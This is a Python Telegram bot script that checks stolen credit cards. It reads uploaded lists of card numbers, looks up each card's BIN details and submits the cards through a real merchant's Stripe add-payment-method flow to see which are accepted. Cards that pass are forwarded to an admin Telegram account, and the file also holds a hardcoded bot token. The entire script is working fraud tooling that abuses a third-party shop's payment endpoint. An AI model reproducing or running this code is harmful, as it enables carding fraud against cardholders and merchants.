import requests
from user_agent import generate_user_agent
import re
from colorama import Fore
import pyfiglet

RESET = "\033[0m"
ASCII_FONTS = pyfiglet.figlet_format("E R R O R", font="ansi_shadow")
width = 200
height = 10

centered_ascii = "\n".join(line.center(width) for line in ASCII_FONTS.splitlines())

lines_needed = (height - centered_ascii.count("\n")) // 2
vertical_padding = "\n" * lines_needed

my_id = "-1002469657522"
print(Fore.RED + vertical_padding + centered_ascii + vertical_padding + RESET)
import telebot,os
us = generate_user_agent()
import uuid
gu = uuid.uuid4()
mu = uuid.uuid4()
si = uuid.uuid4()
admin = '5133630165'
tok = '7823213811:AAHXLPi8PiDweZolIIpHi8MX6my9YJ4zHNs'
bot = telebot.TeleBot(tok)

headers = {
        'user-agent': us,
    }

response = requests.get('https://shop.wiseacrebrew.com/account/add-payment-method/', headers=headers)

def lookup_bin(bin):
    import requests
    api_url = requests.get("https://bins.antipublic.cc/bins/" + str(bin),timeout=30).json()
    return api_url
def return_info(api_url):
    if 'Invalid BIN' in api_url or 'detail' in api_url:
        return False
    brand = api_url["brand"]
    card_type = api_url["type"]
    level = api_url["level"]
    bank = api_url["bank"]
    country_name = api_url["country_name"]
    country_flag = api_url["country_flag"]
    bin = api_url['bin']
    c_c = api_url['country']
    info = f"""
𝘽𝙞𝙣 : {bin}
𝙄𝙣𝙛𝙤 : {brand}-{card_type}-{level}
𝘽𝙖𝙣𝙠  : {bank}
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 : {country_name} {country_flag} - {c_c}
"""
    return info
nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)

key = re.search(r'"key":"(.*?)"', response.text).group(1)


def chk(card):
    cc,mm,yy,cv = card.split("|")
    import requests
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,ja-JP;q=0.8,ja;q=0.7,ar-DZ;q=0.6,ar;q=0.5,en-IN;q=0.4',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': us,
    }

    data = f'type=card&card[number]={cc}&card[cvc]={cv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=DZ&pasted_fields=number%2Ccvc&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=89767&client_attribution_metadata[client_session_id]=b8dc727a-0f17-4903-8977-9c4784d522f9&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid={gu}&muid={mu}&sid={si}&key={key}&_stripe_version=2024-06-20'

    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    try:
        idd = response.json()['id']
    except:
        print(Fore.RED + 'visa is bad ')

    import requests


    headers = {
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-GB;q=0.8,en;q=0.7,ar-AE;q=0.6,en-US;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://shop.wiseacrebrew.com',
        'priority': 'u=1, i',
        'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': us,
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
    }

    data = {
        'action': 'create_and_confirm_setup_intent',
        'wc-stripe-payment-method': idd,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce,
    }

    response = requests.post('https://shop.wiseacrebrew.com/', params=params, headers=headers, data=data)
    try:
        res = response.json()
    except:
        res = 'bad'
    return response.json()

@bot.message_handler(content_types=['document'])
def chk_compo(message):
    finfo = bot.get_file(message.document.file_id)
    downlod = bot.download_file(finfo.file_path)
    path = os.path.join("files", message.document.file_name)
    with open(path, "wb") as compo:
        compo.write(downlod)
    file = open(path, encoding="utf-8")
    bot.reply_to(message,'checking your compo please wait.....')
    for line in file:
        visa = line.strip()
        api = lookup_bin(visa[:6])
        res = chk(visa)
        if res['success'] != True:
            if 'declined.' in res['data']['error']['message']:
                print(Fore.RED + f'DECLINED - {visa}')
            elif 'does not support' in res['data']['error']['message']:
                print(Fore.RED + f'DECLINED - {visa}')
            elif 'card number is incorrect.' in res['data']['error']['message']:
                print(Fore.RED + f'INCORRECT - {visa}')
            elif "card's security code" in res['data']['error']['message']:
                print(Fore.GREEN + f'APPROVED : CVV - {visa}')
                mess = f'''
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝒄𝒄 : {visa}
𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : CVV INCORRECT
𝒈𝒂𝒕𝒆 : 𝖘𝖙𝖗𝖎𝖕𝖊 𝖆𝖚𝖙𝖍 
{return_info(api)}
𝗕𝗬 𝗘𝗥𝗥𝗢𝗥'''
                bot.send_message(admin,mess)
            elif "funds." in res['data']['error']['message']:
                print(Fore.GREEN + f'APPROVED : FUNDS - {visa}')
                mess = f'''
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝒄𝒄 : {visa}
𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : insuffeint funds
𝒈𝒂𝒕𝒆 : 𝖘𝖙𝖗𝖎𝖕𝖊 𝖆𝖚𝖙𝖍 
{return_info(api)}
𝗕𝗬 𝗘𝗥𝗥𝗢𝗥'''
                bot.send_message(admin,mess)
            else:
                print(Fore.YELLOW + visa + str(res))
        else:
            print(Fore.GREEN + f'DONE ADD YOUR CARD - APPROVED / {visa}')
            mess = f'''
𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅

𝒄𝒄 : {visa}
𝒓𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : Approved
𝒈𝒂𝒕𝒆 : 𝖘𝖙𝖗𝖎𝖕𝖊 𝖆𝖚𝖙𝖍 
{return_info(api)}
𝗕𝗬 𝗘𝗥𝗥𝗢𝗥'''
            bot.send_message(admin,mess)

bot.infinity_polling(timeout=25)


# احفظ حقوقي @ERROR_3MK
